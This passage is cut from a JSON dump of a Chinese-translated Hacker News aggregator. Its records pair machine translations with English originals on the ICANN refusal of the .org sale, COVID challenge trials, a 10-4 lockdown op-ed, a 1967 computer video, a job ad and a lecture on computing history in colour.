，但当时人们普遍认为这是ICANN利用.org合同为ISOC和ISOC的工作提供补贴。无论如何，这最终都是一笔相当大的补贴：2018年，PIR从.org获得的收入超过9200万美元。\n这里的实际机制有些复杂：它不像ISOC自己运行注册表。取而代之的是，他们创建了一个新的非营利性子公司，公共利益登记处(PIR)，以持有与ICANN的合同，以管理.org。PIR反过来将实际操作承包给Afilias，Afilias本身也是一堆其他域的注册中心。[这并不是一种罕见的结构。例如，VeriSign是.com的注册表，但他们也为图瓦卢运行.tv。]。这将很快与我们的故事相关。此外，在2019年夏天，PIR与ICANN续签了十年协议，但是在新的条款下：更宽松的合同条件，以反映新gTLD的合同条件(是的，包括.wtf)，包括取消价格上限和某些其他条款。\n因此，到了2018年，ISOC以.org注册费的形式坐拥相当大的持续收入流。然而，ISOC管理层认为，让他们所有的资金基本上都依赖于一个收入来源是不明智的，而且实际运行.org与ISOC的主要任务是不匹配的。相反，他们达成了一项协议，将PIR(因此是.org合同)出售给一家名为ethos Capital的私募股权公司，这就是事情变得有趣的地方。\n通常情况下，这将是一笔看似直截了当的交易，但根据.org注册协议的条款，ISOC必须获得ICANN的批准才能出售(或者至少要让PIR保留合同)：\n7.5关于控制权的变更；转让和分包。除本节7.5所述外，未经另一方事先书面批准，任何一方均不得转让其在本协议项下的任何权利和义务，这种批准不会被无理拒绝。就本节7.5而言，直接或间接变更注册处运营方的控制权或与TLD的任何关键职能(如规范10第6节所确定的)有关的任何分包安排(“重大分包安排”)应被视为转让。\n在提议的交易宣布后不久，许多组织(特别是Access Now和EFF)开始对这笔交易表示担忧。你可以在这里找到这些担忧的详细记录，但我认为对这一论点的一个公平总结是，.org是特殊的(特别是许多非政府组织依赖于它)，不能相信思潮能够负责任地管理它。与会者提出了一些关切，包括民族精神可能会为了实现利润最大化而大幅提高价格，或者他们可能更容易受到政府的压力，要求他们删除批评他们的非政府组织的域名。你可以在这里找到Mozilla对拟议出售的评论。加州总检察长办公室在一封信中也发表了反对意见，暗示可能会采取独立行动阻止出售，称：\n该办公室将继续评估这一问题，并将采取一切必要的行动来保护加州人和非营利性社区。\n反过来，ethos和ISOC自己也发起了相当积极的公关活动，包括制定了一些新的承诺，旨在缓解人们提出的担忧，例如成立了一个新的“管理委员会”，在隐私和政策决策方面有一定程度的投入，修改了与ICANN的运营协议，规定未来可能会进行额外的监督，并承诺在8年内每年涨价不超过10%。最终，这些努力没有成功：ICANN在4月30日宣布，他们将拒绝同意这笔交易(参见此处了解他们的理由)。\n据我所知，这一决定只是让情况回到了原来的状态(参见米尔顿·穆勒(Milton Mueller)的这篇帖子，了解更详细的分析)。特别是，ISOC将继续运营PIR，并能够从自动续签中受益(无论如何，协议将持续到2029年)。就一个月前你信任PIR负责任地管理.org的程度而言，没有理由认为这一点已经改变(当然，人们的观点可能因为拟议中的出售而改变)。然而，正如穆勒指出的那样，ethos为了让交易更受欢迎而做出的所有承诺都不适用于这里，特别是，由于2019年的新合同，PIR ISOC可以自由提价，而不受ethos提出的10%的年度承诺的约束。\n值得一提的是，“Save dot Org”至少看起来并不乐于将.org留在ISOC手中，尤其是呼吁ICANN重新竞标合同。他们是这样说的：\n这不是保护.org域所需的最后一步。ICANN现在必须公开招标程序，为.org域名寻找新的归宿。ICANN已经建立了流程和标准，概述了如何进行重新分配流程。我们期待看到一个竞争激烈的进程，并渴望支持全球非营利组织参与这一进程。\n对于ICANN来说，实际上试图将.org从ISOC手中夺走似乎是非常有争议的，而且ICANN还没有就他们打算在这里做什么给出任何真正的信号。他们可能会试图重新投标这份合同(尽管我不清楚合同条款是否真的允许这样做)，或者他们只是满足于保持现状，让ISOC运营.org到2029年。\n不管互联网协会和ICANN在这里选择做什么，我认为这揭示了当前的域名生态系统在多大程度上依赖于对各种行为者将要做什么的非正式理解，而不是对做这些行为的正式承诺。例如，许多反对出售的人似乎期待ISOC为了公众利益继续管理.org，并认为ethos出售威胁到了这一点。然而，作为一个实际问题，注册协议并没有包括任何这样的义务，特别是没有什么能真正阻止他们为了最大化利润而大幅提高价格，因为反对者认为ethos可能会这样做(尽管ISOC的非营利性地位意味着他们不能直接剥离这些利润)。同样，那些反对出售和支持出售的人似乎对ICANN应该做的事情有着截然不同的期望(积极确保.org以特定的方式管理，而不是仅仅保持系统轻描淡写地运行)，最终还是依赖ICANN的自由裁量权采取这样或那样的行动。这是一个孤立的事件，还是一个更深层次的脱节的迹象，将导致未来摩擦的增加，这还有待观察。", "note_en": "If you are following the tech news, you might have seen the announcement that ICANN  withheld consent for the change of control of the Public Interest Registry and that this had some implications for .org.  However, unless you follow a lot of DNS inside baseball, it might not be that clear what all this means. This post is intended to give a high level overview of the background here and what happened with .org. In addition, Mozilla has been actively engaged in the public discussion on this topic; see  here for a good starting point.\n  As you’ve probably noticed, Web sites have names like “mozilla.org”, “google.com”, etc. These are called “domain names.” The way this all works is that there are a number of “top-level domains” (.org, .com, .io, …) and then people can get names within those domains (i.e., that end in one of those). Top level domains (TLDs) come in two main flavors:\n Country-code top-level domains (ccTLDs) which represent some country or region like .us (United States), .uk (United Kingdom, etc.)\n Generic top-level domains (gTLDs) which don’t correspond to some country or region, such as .com, .org, etc.\n Back at the beginning of the Internet, there were five gTLDs which were intended to roughly reflect the type of entity registering the name:\n  It’s important to remember that until the 90s, much of the Internet ran under an  Acceptable Use Policy which discouraged/forbid commercial use and so these distinctions were inherently somewhat fuzzy, but nevertheless people had the rough understanding that .org was for non-profits and the like and .com was for companies.\n During this period the actual name registrations were handled by a series of government contractors (first SRI and then Network Solutions) but the creation and assignment of the top-level domains was under the control of the  Internet Assigned Numbers Authority (IANA), which in practice, mostly meant the decisions of its Director,  Jon Postel. However, as the Internet became bigger, this became increasingly untenable especially as IANA was run under a contract to the US government. Through a long and somewhat complicated series of events, in 1998 this responsibility was handed off to the  Internet Corporation for Assigned Names and Numbers (ICANN), which administers the overall system, including setting the overall rules and determining which gTLDs will exist (which ccTLDs exist is determined by ISO 3166-1 country codes, as described in  RFC 1591). ICANN has created a pile of new gTLDs, such as .dev, .biz, and  .wtf (you may be wondering whether the world really needed .wtf, but there it is). As an aside, many of the newer names you see registered are not actually under gTLDs, but rather ccTLDs that happen to correspond to countries lucky enough to have cool sounding country codes. For instance,  .io is actually the British Indian Ocean’s TLD and  .tv belongs to Tuvalu.\n One of the other things that ICANN does is determine who gets to  run each TLD. The way this all works is that ICANN determines who gets to be the  registry, i.e., who keeps the records of who has which name as well as some of the technical data needed to actually route name lookups. The actual work of registering domain names is done by a  registrar, who engages with the customer. Importantly, while registrars compete for business at some level (i.e., multiple people can sell you a domain in .com), there is only one registry for a given TLD and so they don’t have any price competition within that TLD; if you want a .com domain, VeriSign gets to set the price floor. Moreover, ICANN doesn’t really try to keep prices down; in fact, they recently removed the cap on the price of .org domains (bringing it in line with most other TLDs). One interesting fact about these contracts is that they are effectively perpetual: the contracts themselves are for quite long terms and registry agreements typically provide for automatic renewal except under cases of significant misbehavior by the registry. In other words, this is a more or less permanent claim on the revenues for a given TLD.\n The bottom line here is that this is all quite lucrative. For example, in FY19 VeriSign’s revenue was over  $1.2 billion. ICANN itself makes money in two main ways. First, it takes a cut of the revenue from each domain registration and second it  auctions off the contracts for new gTLDs if more than one entity wants to register them. In the fiscal year ending in June 2018, ICANN made  $136 million in total revenues (it was $302 million the previous year due to a large amount of revenue from gTLD auctions).\n  This brings us to the story of ISOC and .org. Until 2003, VeriSign operated .com, .net, and .org, but ICANN and VeriSign agreed to give up running .org (while retaining the far more profitable .com). As stated in their  proposal:\n As a general matter, it will largely eliminate the vestiges of special or unique treatment of VeriSign based on its legacy activities before the formation of ICANN, and generally place VeriSign in the same relationship with ICANN as all other generic TLD registry operators. In addition, it will return the .org registry to its original purpose, separate the contract expiration dates for the .com and .net registries, and generally commit VeriSign to paying its fair share of the costs of ICANN without any artificial or special limits on that responsibility.\n The  Internet Society (ISOC) is a nonprofit organization with the mission to support and promote “the development of the Internet as a global technical infrastructure, a resource to enrich people’s lives, and a force for good in society”. In 2002, they submitted one of  11 proposals to take over as the registry for .org and ICANN ultimately selected them. ICANN had a list of  11 criteria for the selection and the board  minutes are pretty vague on the reason for selecting ISOC, but at the time this was widely understood as ICANN using the .org contract to provide a subsidy for ISOC and ISOC’s work. In any case, it ended up being quite a large subsidy: in 2018, PIR’s revenue from .org was over  $92 million.\n The actual mechanics here are somewhat complicated: it’s not like ISOC runs the registry itself. Instead they created a new non-profit subsidiary, the  Public Interest Registry (PIR), to hold the contract with ICANN to manage .org. PIR in turn contracts the actual operations to  Afilias, which is also the registry for a pile of other domains in their own right. [This isn’t an uncommon structure. For instance, VeriSign is the registry for .com, but they also run .tv for Tuvalu.] This will become relevant to our story shortly. Additionally, in the summer of 2019, PIR’s ten year agreement with ICANN renewed, but under new terms: looser contractual conditions to mirror those for the new gTLDs (yes, including .wtf), including the removal of a price cap and certain other provisions.\n  So, by 2018, ISOC was sitting on a pretty large ongoing revenue stream in the form of .org registration fees. However, ISOC management felt that having essentially all of their funding dependent on one revenue source was unwise and that actually running .org was a mismatch with ISOC’s main mission. Instead, they entered into a deal to sell PIR (and hence the .org contract) to a private equity firm called  Ethos Capital, which is where things get interesting.\n Ordinarily, this would be a straightforward-seeming transaction, but under the terms of the .org  Registry Agreement, ISOC had to get approval from ICANN for the sale (or at least for PIR to retain the contract):\n 7.5              Change of Control; Assignment and Subcontracting.  Except as set forth in this Section 7.5, neither party may assign any of its rights and obligations under this Agreement without the prior written approval of the other party, which approval will not be unreasonably withheld.  For purposes of this Section 7.5, a direct or indirect change of control of Registry Operator or any subcontracting arrangement that relates to any Critical Function (as identified in Section 6 of Specification 10) for the TLD (a “Material Subcontracting Arrangement”) shall be deemed an assignment.\n Soon after the proposed transaction was announced, a number of organizations (especially Access Now and EFF) started to surface concerns about the transaction. You can find a detailed writeup of those concerns  here but I think a fair summary of the argument is that .org was special (and in particular that a lot of NGOs relied on it) and that Ethos could not be trusted to manage it responsibly. A number of concerns were raised, including that Ethos might aggressively raise prices in order to maximize their profit or that they could be more susceptible to governmental pressure to remove the domain names of NGOs that were critical of them. You can find Mozilla’s comments on the proposed sale  here. The California Attorney General’s Office also  weighed in opposing the sale in a letter that implied it might take independent action to stop it, saying:\n This office will continue to evaluate this matter, and will take whatever action necessary to protect Californians and the nonprofit community.\n In turn, Ethos and ISOC mounted a fairly aggressive PR  campaign of their own, including creating a number of new commitments intended to alleviate concerns that had been raised, such as a new “Stewardship Council” with some level of input into privacy and policy decisions, an amendment to the operating agreement with ICANN to provide for additional potential oversight going forward, and a promise not to raise prices by more than 10%/year for 8 years. At the end of the day these efforts did not succeed: ICANN announced on April 30 that they would withhold consent for the deal (see  here for their reasoning).\n  As far as I can tell, this decision merely returns the situation to the status quo ante (see this  post by Milton Mueller for some more detailed analysis). In particular, ISOC will continue to operate PIR and be able to benefit from the automatic renewal (and the agreement runs through 2029 in any case). To the extent to which you trusted PIR to manage .org responsibly a month ago, there’s no reason to think that has changed (of course, people’s opinions may have changed because of the proposed sale). However, as Mueller points out, none of the commitments that Ethos made in order to make the deal more palatable apply here, and in particular, thanks to the new contract in 2019, PIR ISOC is free to raise prices without being bound by the 10% annual commitment that Ethos had offered.\n It’s worth noting that “Save dot Org” at least doesn’t seem happy to leave .org in the hands of ISOC and in particular has called for ICANN to rebid the contract. Here’s what they say:\n This is not the final step needed for protecting the .Org domain. ICANN must now open a public process for bids to find a new home for the .Org domain. ICANN has established processes and criteria that outline how to hold a reassignment process. We look forward to seeing a competitive process and are eager to support the participation in that process by the global nonprofit community.\n For ICANN to actually try to take .org away from ISOC seems like it would be incredibly contentious and ICANN hasn’t given any real signals about what they intend to do here. It’s possible they will try to rebid the contract (though it’s not clear to me exactly whether the contract terms really permit this) or that they’ll just be content to leave things as they are, with ISOC running .org through 2029.\n Regardless of what the Internet Society and ICANN choose to do here, I think that this has revealed the extent to which the current domain name ecosystem depends on informal understandings of what the various actors are going to do, as opposed to formal commitments to do them. For instance, many opposed to the sale seem to have expected that ISOC would continue to manage .org in the public interest and felt that the Ethos sale threatened that. However, as a practical matter the registry agreement doesn’t include any such obligation and in particular nothing really stops them from raising prices much higher in order to maximize profit as opponents argued Ethos might do (although ISOC’s nonprofit status means they can’t divest those profits directly). Similarly, those who were against the sale and those who were in favor of it seem to have had rather radically different expectations about what ICANN was supposed to do (actively ensure that .org be managed in a specific way versus just keep the system running with a light touch) and at the end of the day were relying on ICANN’s discretion to act one way or the other. It remains to be seen whether this is an isolated incident or whether this is a sign of a deeper disconnect that will cause increasing friction going forward.", "posttime": "2020-05-12 11:36:36", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "app,发生,heck,icann", "title": ".org到底发生了什么事？", "title_en": "What the Heck Happened with .org?", "transed": 1, "url": "https://blog.mozilla.org/blog/2020/05/11/what-the-heck-happened-with-org/", "via": "", "real_tags": ["app", "发生", "heck", "icann"]}, {"category": "", "categoryclass": "", "imagename": "f58188fb0592324bd5e3e5bf7c959610.jpeg", "infoid": 1001754, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "这是一个有争议的想法：故意让人们感染导致冠状病毒的病毒，以测试潜在疫苗的有效性。\n这种方法被称为人体挑战试验，这不是疫苗测试的通常方式。更常见的是，研究人员追踪数千人，其中一些人接种疫苗，另一些人服用安慰剂，然后看看谁在他们的自然生命过程中被感染。这是一个较慢的过程，但比起在人们接种疫苗后故意感染他们，风险更小。\n..。", "note_en": "It’s a controversial idea: Intentionally infect people with the virus that causes Covid-19 to test the effectiveness of a potential vaccine.\n  The approach is called a human challenge trial, and it’s not the usual way a vaccine is tested. More commonly, researchers track thousands of people, some of whom receive a vaccine, and others a placebo, and then see who becomes infected in the natural course of their lives. It’s a slower process, but poses fewer risks than deliberately infecting people after they’ve received a vaccine.\n...", "posttime": "2020-05-12 11:22:12", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "coronavirus,冠状病毒,病毒,接种,speeding", "title": "加速接种冠状病毒疫苗的一个想法：故意感染人", "title_en": "One Idea for Speeding a Coronavirus Vaccine: Deliberately Infecting People", "transed": 1, "url": "https://www.wsj.com/articles/one-idea-for-speeding-a-coronavirus-vaccine-deliberately-infecting-people-11589221164", "via": "", "real_tags": ["冠状病毒", "病毒", "接种", "speeding"]}, {"category": "", "categoryclass": "", "imagename": "7f98543a1d94580aeb2e18c3c6d5e8a1.jpg", "infoid": 1001753, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在我最近修理过的SEL810A电脑上，我从冷启动到玩月球着陆器。这台电脑是1967年发布的，曾被中央情报局使用，研究人员……", "note_en": "I go from cold boot to playing Lunar Lander on my recently repaired SEL 810A computer. This computer was released in 1967, and was used by the CIA, research ...", "posttime": "2020-05-12 10:54:02", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "游戏,计算机,playing,sel810a", "title": "在60S计算机上玩游戏", "title_en": "Playing Games on a 60s Computer", "transed": 1, "url": "https://www.youtube.com/watch?v=L743MjJthHY", "via": "", "real_tags": ["游戏", "计算机", "playing", "sel810a"]}, {"category": "", "categoryclass": "", "imagename": "790d9f055825c79f56c4fc42c1c22574.png", "infoid": 1001751, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "全球领先的移动推送通知、Web推送和应用内消息传递。受80万商家信任，每天发送50亿条推送通知。", "note_en": "The world's leader for Mobile Push Notifications, Web Push, and In-App Messaging. Trusted by 800k businesses to send 5 billion Push Notifications per day.", "posttime": "2020-05-12 10:25:10", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "rust,hiring,推送", "title": "OneSignal正在招聘一名对Go和Rust感兴趣的后端工程经理", "title_en": "OneSignal is hiring a Back end Engineering Manager interested in Go and Rust", "transed": 1, "url": "https://onesignal.com/careers/76fc9e90-4b89-4c0b-afe3-4b5fa9da33c5", "via": "", "real_tags": ["rust", "hiring", "推送"]}, {"category": "", "categoryclass": "", "imagename": "7f98543a1d94580aeb2e18c3c6d5e8a1.jpg", "infoid": 1001750, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在我最近修理过的SEL810A电脑上，我从冷启动到玩月球着陆器。这台电脑是1967年发布的，曾被中央情报局使用，研究人员……", "note_en": "I go from cold boot to playing Lunar Lander on my recently repaired SEL 810A computer. This computer was released in 1967, and was used by the CIA, research ...", "posttime": "2020-05-12 10:10:33", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "游戏,计算机,playing,sel810a", "title": "在60S计算机上玩游戏", "title_en": "Playing Games on a 60s Computer", "transed": 1, "url": "https://youtu.be/L743MjJthHY", "via": "", "real_tags": ["游戏", "计算机", "playing", "sel810a"]}, {"category": "", "categoryclass": "", "imagename": "4b3931264fd8d241158732a449cf5813.jpg", "infoid": 1001749, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "如果我们不能在不导致冠状病毒感染死灰复燃的情况下恢复经济活动，我们将面临一个开办和关闭学校和企业的严峻、不可预测的未来。\n我们可以通过利用病毒的一个关键属性找到摆脱这种困境的方法：潜伏期-一个人被感染到他或她可以感染其他人的时间之间平均延迟三天。\n人们可以每两周工作一次，在工作中工作四天，然后在他们可能感染的时候，在家中被封锁10天。当人口被分成两组交替工作的家庭时，这一策略效果更好。\n奥地利学校官员将采用一个简单的版本-从5月18日开始，每两周两组学生上学五天。\n我们在以色列魏茨曼研究所创建的模型预测，这个两周的周期可以将病毒的复制数量-每个感染者感染的平均人数-减少到1人以下。因此，10-4周期可以抑制疫情，同时允许可持续的经济活动。\n即使有人感染了病毒，而且没有症状，他或她每两周也只会与家外的人接触四天，而不是像正常的时间表那样接触10天。这一战略带来了另一个打击：它降低了工作和学校的人口密度，从而减少了病毒的传播。\n学校可以让学生每两周连续四天上课，分两组轮流上课，在其他上学日使用远程学习方法。孩子们会和他们的父母在同一天去上学。\n企业将几乎不间断地工作，在两组工人之间轮流工作，以实现定期和可预测的生产。这将增强消费者信心，同时支撑供需。\n在禁闭期间，这种方法只需要遵守欧洲国家和纽约市已经证明的距离水平。它防止了开放经济，然后在案件不可避免地死灰复燃时不得不恢复完全封锁的经济和心理成本。给人希望，然后又把它夺走，可能会导致绝望和抵抗。\n10-4例行公事至少为数百万被解雇或无薪休假的人提供了兼职工作。这些工作可以防止失业对精神和身体造成毁灭性的、往往是长期的影响。对于那些靠现金生活的人来说，将有四天的时间来谋生，这降低了完全无视封锁的经济必要性。企业破产也将减少，从而加快最终的经济复苏。\n循环策略很容易解释和执行。就谁可以重返工作岗位而言，这是公平的。它适用于任何规模：一所学校，一家公司，一个城镇，一个州。使用循环策略的地区是受保护的：如果繁殖次数小于1，来自外部的感染就不能广泛传播。它还与正在制定的所有其他对策相兼容。\n工人们可以而且仍然应该在工作时使用口罩和保持距离。然而，这一建议并不是以大规模测试为前提的，因为在美国并不是所有地方都可以进行大规模测试，而且可能永远不会在世界大部分地区进行。只要案件稳步下降，表明封锁已经有效，就可以启动。\n循环战略应该是全面退出战略的一部分，包括有症状的人进行自我隔离，接触者追踪和隔离，以及对风险群体的保护。循环策略可以在特定的试用期内在有限的区域内进行测试，甚至可以测试一个月。如果感染率增加，可以调整为减少工作日。相反，如果事情进展顺利，可以增加额外的工作日。在某些情况下，每个两周周期中只有四五个禁售日仍然可以防止死灰复燃。\n冠状病毒疫情是一个可怕的敌人，但也不是不可战胜的。通过明智地安排我们的活动，以一种解释病毒内在动态的方式，我们可以更快地战胜它，并加速完全重返工作、学校和其他活动。\n尤里·阿隆(Uri Alon)和罗恩·米洛(Ron Milo)是以色列魏兹曼科学研究所(Weizmann Institute Of Science)的计算生物学和系统生物学教授。Eran Yashiv是特拉维夫大学和伦敦经济学院宏观经济学中心的经济学教授。\n“泰晤士报”致力于向编辑发表各种信件。我们想听听您对这篇文章或我们的任何一篇文章的看法。这里有一些小贴士。这是我们的电子邮件：Letters@nytimes.com。", "note_en": "If we cannot resume economic activity without causing a resurgence of Covid-19 infections, we face a grim, unpredictable future of opening and closing schools and businesses.\n We can find a way out of this dilemma by exploiting a key property of the virus: its latent period — the three-day delay on average between the time a person is infected and the time he or she can infect others.\n People can work in two-week cycles, on the job for four days then, by the time they might become infectious, 10 days at home in lockdown. The strategy works even better when the population is split into two groups of households working alternating weeks.\n Austrian school officials will adopt a simple version — with two groups of students attending school for five days every two weeks — starting May 18.\n Models we created at the Weizmann Institute in Israel predict that this two-week cycle can reduce the virus’s reproduction number — the average number of people infected by each infected person — below one. So a 10-4 cycle could suppress the epidemic while allowing sustainable economic activity.\n  Even if someone is infected, and without symptoms, he or she would be in contact with people outside their household for only four days every two weeks, not 10 days, as with a normal schedule. This strategy packs another punch: It reduces the density of people at work and school, thus curtailing the transmission of the virus.\n Schools could have students attend for four consecutive days every two weeks, in two alternating groups, and use distance-learning methods on the other school days. Children would go to school on the same days as their parents go to work.\n Businesses would work almost continuously, alternating between two groups of workers, for regular and predictable production. This would increase consumer confidence, shoring up supply and demand simultaneously.\n During lockdown days, this approach requires adherence only to the level of distancing already being demonstrated in European countries and New York City. It prevents the economic and psychological costs of opening the economy and then having to reinstate complete lockdown when cases inevitably resurge. Giving hope and then taking it away can cause despair and resistance.\n A 10-4 routine provides at least part-time employment for millions who have been fired or sent on leave without pay. These jobs prevent the devastating, and often long-lasting, mental and physical impacts of unemployment. For those living on cash, there would be four days to make a living, reducing the economic necessity to disregard lockdown altogether. Business bankruptcies would also be reduced, speeding up eventual economic recovery.\n The cyclic strategy is easy to explain and to enforce. It is equitable in terms of who gets to go back to work. It applies at any scale: a school, a firm, a town, a state. A region that uses the cyclic strategy is protected: Infections coming from the outside cannot spread widely if the reproduction number is less than one. It is also compatible with all other countermeasures being developed.\n Workers can, and should still, use masks and distancing while at work. This proposal is not predicated, however, on large-scale testing, which is not yet available everywhere in the United States and may never be available in large parts of the world. It can be started as soon as a steady decline of cases indicates that lockdown has been effective.\n The cyclic strategy should be part of a comprehensive exit strategy, including self-quarantine by those with symptoms, contact tracing and isolation, and protection of risk groups. The cyclic strategy can be tested in limited regions for specific trial periods, even a month. If infections rates grow, it can be adjusted to fewer work days. Conversely, if things are going well, additional work days can be added. In certain scenarios, only four or five lockdown days in each two-week cycle could still prevent resurgence.\n The coronavirus epidemic is a formidable foe, but it is not unbeatable. By scheduling our activities intelligently, in a way that accounts for the virus’s intrinsic dynamics, we can defeat it more rapidly, and accelerate a full return to work, school and other activities.\n Uri Alon and Ron Milo are professors of computational and systems biology at the Weizmann Institute of Science in Israel.  Eran Yashiv is a professor of economics at Tel Aviv University and at the London School of Economics Center for Macroeconomics.\n The Times is committed to publishing   a diversity of letters  to the editor. We’d like to hear what you think about this or any of our articles. Here are some   tips . And here’s our email:   letters@nytimes.com .", "posttime": "2020-05-12 09:55:39", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "coronavirus,冠状病毒,病毒,economy", "title": "10-4：如何利用冠状病毒的弱点重新开放经济", "title_en": "10-4: How to Reopen the Economy by Exploiting the Coronavirus’s Weak Spot", "transed": 1, "url": "https://www.nytimes.com/2020/05/11/opinion/coronavirus-reopen.html", "via": "", "real_tags": ["冠状病毒", "病毒", "economy"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1001748, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "只看彩色图像就能为其他人熟知的历史带来新的观点和叙述，计算史也不例外。马丁·坎贝尔·凯利(Martin Campbell-Kelly)从出人意料的罕见彩色图像中重建了一段计算史。\n这是2013年格雷沙姆学院/英国数学史学会会议的一部分。\n马丁·坎贝尔·凯利(Martin Campbell-Kelly)是华威大学(University Of Warwick)计算机系荣誉退休教授，专门研究计算机史。他的著作包括与威廉·阿斯莱姆合著的“计算机：信息机的历史”(#34；Computer：A History of the Information Machine)，“从机票预订到刺猬Sonic：软件业的历史”(Sonic the Hedgehog：A History of the Software Industry)，以及“ICL：商业与技术史”(ICL：A Business and Technology History)。他是“查尔斯·巴贝奇文集”的编辑。坎贝尔-凯利教授是英国计算机学会会员，朴茨茅斯大学客座教授，ACM通讯专栏作家。他是ACM历史委员会成员，英国数学史学会理事会成员，BCS计算机保护协会委员。他是《IEEE计算史年鉴》、《国际工程技术史杂志》、《卢瑟福期刊》的编委会成员，也是《计算史上的斯普林格系列》的主编。\n2013年10月31日，彩色计算史教授马丁·坎贝尔-凯利·维特(Martin Campbell-Kelly View)PDF打印。\n近年来，“彩色第二次世界大战”、“彩色伦敦地铁”等书籍层出不穷。这些受欢迎的出版物代表了一种新的历史体裁，通过低成本的彩色印刷和电子出版物成为可能。在很长一段时间里，历史出版物中的彩色插图是不可能的，因为印刷的经济性只允许黑白。因此，档案馆中的彩色图像直到现在才被重新发现。\n五颜六色的意象引出了新的观点和叙事。在一个层面上，颜色传达了更大的情感影响-黑白不能完全传达战争时期血与火的恐怖，或和平时期蓝天的宁静。彩色图像的制作成本很高，相对罕见，而且他们创作的偶然性表明了历史上不同的道路。这个讲座提供了一些由彩色图像所暗示的计算机史上的新奇插曲。虽然讲座仅限于计算机历史的特定领域，但它也呼吁历史研究人员对插图给予更多关注，并挖掘低成本彩色复制的戏剧性潜力。\n彩色成像技术是彩色插图的简短历史，有来自信息处理领域的例子。这些包括手绘版画、色调和彩色照片、彩印、三色制版、双色调和凹版印刷。\n在此之前，数据库说明了二十世纪早期档案系统的发展，展示了它们在办公环境中的背景，以及这些系统是如何进入战后计算机行业的。档案系统有两种类型，它们很快成为一种商品：活页立式文件柜和卡片索引系统。然而，两家美国公司兰德(Rand)和卡迪克斯(Kardex)开发了创新的(并获得大量专利的)申请精细化，使它们成为成功的全球业务。1927年，这两家公司与雷明顿打字机公司合并，成立了雷明顿兰德公司。1952年，雷明顿·兰德生产了第一台商用计算机Univac。\n“艾略特·诺伊斯和大型机设计”描述了IBM内部计算机设计的演变。在战前，IBM在工业设计方面落后--该公司的办公室机器颜色阴郁，配上安妮女王的腿，完全可以设计成维多利亚时代的产品。1937年，IBM聘请诺曼·贝尔·格德斯(Norman Bel Geddes)为其产品提供流线型外观，但这些产品直到20世纪40年代末才投放市场。1952年，IBM首席执行官小托马斯·沃森(Thomas Watson Jr)聘请了受包豪斯启发的设计师艾略特·诺伊斯(Eliot Noyes)来改造IBM的所有产品。他的第一个成功是标志性的IBM SElectric高尔夫球打字机。随后，他创造了“电脑外观”，这一时代精神不仅影响了IBM，还渗透到了整个计算机行业和科幻电影，如“2001：太空漫游”。", "note_en": "Only looking at coloured imagery leads to new viewpoints and narratives for otherwise well-known histories, and the history of computing is no exception. Martin Campbell-Kelly reconstructs a history of computing from surprisingly rarely-seen colour images.\n This is a part of the 2013 Gresham College / British Society of the History of Mathematics conference.\n  Martin Campbell-Kelly is emeritus professor in the Department of Computer Science at the University of Warwick, where he specializes in the history of computing. His books include &#34;Computer: A History of the Information Machine,&#34; co-authored with William Aspray, &#34;From Airline Reservations to Sonic the Hedgehog: A History of the Software Industry,&#34; and &#34;ICL: A Business and Technical History.&#34; He is editor of the Collected Works of Charles Babbage. Professor Campbell-Kelly is a Fellow of the British Computer Society, visiting professor at Portsmouth University, and a columnist for the Communications of the ACM. He is a member of the ACM History Committee, a council member of the British Society for the History of Mathematics, and a committee member of the BCS Computer Conservation Society. He is a member of the editorial boards of the IEEE Annals of the History of Computing, the International Journal for the History of Engineering and Technology, the Rutherford Journal, and editor-in-chief of the Springer Series in the History of Computing.\n  31 October 2013     The History of Computing in Colour  Professor Martin Campbell-Kelly      View PDF    Print\n  In recent years there has been a spate of books with titles like The Second World War in Colour, The London Underground in Colour, and so on. These popular publications represent a new historical genre made possible by low-cost colour printing and electronic publication. For a long time colour illustration in historical publications was not possible because the economics of printing permitted nothing other than black and white. As a result there are coloured images in archives that are only now being rediscovered.\n  Coloured imagery leads to new viewpoints and narratives. At one level colour conveys a much greater emotional impact—black and white cannot fully convey the horror of blood and fire in time of war, or the serenity of a blue sky in time of peace. Coloured images were expensive to produce, relatively rare, and the happenstance of their creation suggests different pathways through history. This lecture offers some novel byways in computer history suggested by colour imagery. Although the lecture is confined to the specific domain of the history of computing, it is also a call for historical researchers in general to give more attention to illustration and to exploit the dramatic potential of low-cost colour reproduction.\n   Colour Imaging Technology is a short history of colour illustration, with examples from the domain of information processing. These include hand-coloured engravings, toned and tinted photographs, chromolithography, the 3-colour process, duotones, and rotogravure.\n  Before the Database illustrates the development of filing systems in the early twentieth century, showing their context in the office environment and how this fed into the post-war computer industry. Filing systems were of two types that quickly became a commodity: loose-leaf vertical filing cabinets, and card-index systems. However, two American firms, Rand and Kardex, developed innovative (and heavily patented) refinements of filing that turned them into successful worldwide operations. In 1927 the firms merged with Remington Typewriter to form Remington Rand. In 1952 Remington Rand produced the Univac, the first commercial computer.\n  Eliot Noyes and Mainframe Design describes the evolution of computer design inside IBM. Before the war, IBM was a laggard in industrial design—the company’s office machines, with their sombre colours and Queen Anne legs, could have been designed in the Victorian era. In 1937 IBM hired Norman Bel Geddes to give its products a streamlined look, but these did not reach the market until the late 1940s. In 1952 IBM’s chief executive Thomas Watson Jr hired the Bauhaus-inspired designer Eliot Noyes to transform all of IBM’s products. His first success was the iconic IBM Selectric golf-ball typewriter.  He went on to create the “computer look”, a zeitgeist that affected not just IBM, but pervaded the whole computer industry and sci-fi movies such as 2001: A Space Odyssey.", "posttime": "2020-05-12 09:41:56", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "彩色,computing,历史", "title": "彩色计算(2013)", "title_en": "Computing in Colour 